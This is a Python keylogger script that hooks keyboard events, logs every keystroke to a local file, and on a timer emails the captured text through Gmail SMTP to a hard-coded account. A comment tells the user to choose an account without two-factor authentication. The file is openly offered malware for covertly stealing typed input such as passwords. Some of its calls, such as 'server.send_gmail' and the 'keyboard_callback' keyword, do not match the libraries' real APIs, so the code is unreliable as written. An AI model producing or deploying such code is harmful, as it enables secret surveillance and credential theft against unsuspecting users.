import keyboard  
import smtplib 
from threading import Semaphore, Timer

REPORT_TIME = 1200 
# Your Email Should not have any two factor authentication.
EMAIL_ADDRESS = "(Email Id)"
EMAIL_PASSWORD = "(Email Password)"

class Keylogger:
    def __init__(self, interval):
        # we gonna pass REPORT_TIME to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        output = open("output.txt", "w+")
        output.write(self.log)

    def send_gmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.send_gmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.send_gmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(keyboard_callback=self.keyboard_callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=REPORT_TIME)
    keylogger.start()